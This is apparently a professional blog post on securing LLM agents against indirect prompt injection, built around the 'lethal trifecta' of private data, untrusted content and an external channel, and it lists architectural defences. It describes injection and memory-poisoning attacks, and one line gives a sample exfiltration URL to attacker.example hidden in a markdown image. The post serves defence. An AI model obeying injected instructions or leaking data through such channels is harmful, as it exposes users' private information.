---
title: "You can't prompt your way out of prompt injection"
description: "Why agent security is an architecture problem, the three conditions that make an agent exploitable, and the defenses that actually hold."
date: 2026-10-26
mode: professional
---

If I had to pick the most important unsolved problem in agents right now, it's this one.

## The core problem

Language models can't reliably tell instructions apart from data. To the model, both are just tokens in the same context window.

So when an agent reads a document, a web page, an email, a database field or a code comment, that content lands right next to its operating instructions. Anyone who can write to something the agent reads can try to redirect it.

That's **indirect prompt injection**. The attack isn't in the user's message. It's in content the agent picks up along the way, which makes it very different from a jailbreak, and much harder to defend against.

## The lethal trifecta

The clearest mental model I know comes from Simon Willison's [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/). An agent is exploitable when it has all three of these:

1. **Access to private data:** email, documents, databases, source code.
2. **Exposure to untrusted content:** anything from outside your trust boundary.
3. **A way to communicate externally:** API calls, links, images, outgoing messages.

The private data is the payload. The untrusted content carries the instruction. The external channel is the way out.

Any one of these alone is fine. All three together is the dangerous setup, and it's also exactly the combination that makes agents useful. That's the whole problem.

It works as a quick design test. Look at any agent and ask whether it has all three. It takes about ten seconds.

## Why filters aren't enough

There's no system prompt that reliably resists injection. Detection models help at the margin, but attackers adapt, and a filter that catches 99% of attempts still lets the 1% through. If your design assumes the filter catches everything, the system isn't secure.

The more useful position is to treat injection as a property of how these models work, not a bug that'll be patched soon. Prevention by filtering is unreliable. Containment works.

In other words: **constrain what the agent can do, not just what it's told to do.**

## Defenses that hold

Roughly in order of value:

1. **Remove a leg of the trifecta where you can.** Does this agent really need to send things externally? Does it need untrusted content and private data in the same context? Often the answer is no, and nobody asked.
2. **Run the agent as the user, not as a service account.** Pass the requesting user's credentials through, so the agent can never do more than that person could. This one control removes the classic "confused deputy" problem, where a privileged agent is tricked into acting on someone else's behalf.
3. **Track tainted content.** Once untrusted content is in the context, restrict which actions are allowed. An agent that just read a customer-submitted document shouldn't be able to call `send_email` without a person approving it.
4. **Close the quiet exits.** The subtle exfiltration channels are things like rendered markdown images (`![](https://attacker.example/?d=SECRET)`), auto-loaded links, and tools that accept any URL. Don't render arbitrary URLs from model output.
5. **Put a deterministic gate on consequential actions.** Anything irreversible, external or expensive goes through a person or a rules engine, not the model's judgment.
6. **Quarantine untrusted content.** In the [dual LLM pattern](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/), one model reads untrusted content but can only pass back structured data, never instructions, to the model that holds the privileges.
7. **Treat agents like privileged accounts.** Keep an inventory, scope their access, rotate their credentials, review them. Many organizations couldn't tell you how many agents they run or what each can touch.
8. **Keep tamper-evident logs.** You'll want them for investigations, and regulation such as the EU AI Act is moving toward requiring logging and human oversight for high-risk systems anyway.

## Two newer variants

**Memory poisoning.** If an agent has long-term memory, an attacker can plant an instruction that gets saved and then fires later, on some unrelated request. Anything with memory across sessions should treat writing to memory as a security boundary, not just a feature.

**The supply chain.** Agent frameworks pull in a lot of dependencies, and a model gateway or tool library sits in a very privileged spot. Pin versions, verify what you install, and keep an eye on what your agents' dependencies can reach.

## Test it like everything else

Keep a set of injection attempts, including indirect ones hidden inside documents and tool outputs, and run it on every release. Fail the build if the rate of policy violations goes up. I described that kind of gate in [Eight habits for evaluating LLM apps and agents](/blog/evaluating-llm-apps-and-agents/). The [OWASP Top 10 for LLM applications](https://genai.owasp.org/llm-top-10/) is a good checklist of what to try.

## The short version

Use the trifecta as a design test. Assume some injection will get through, and limit what it can do when it does: run as the user, restrict actions once untrusted content is in play, close the exits, and put a hard gate in front of anything that matters.
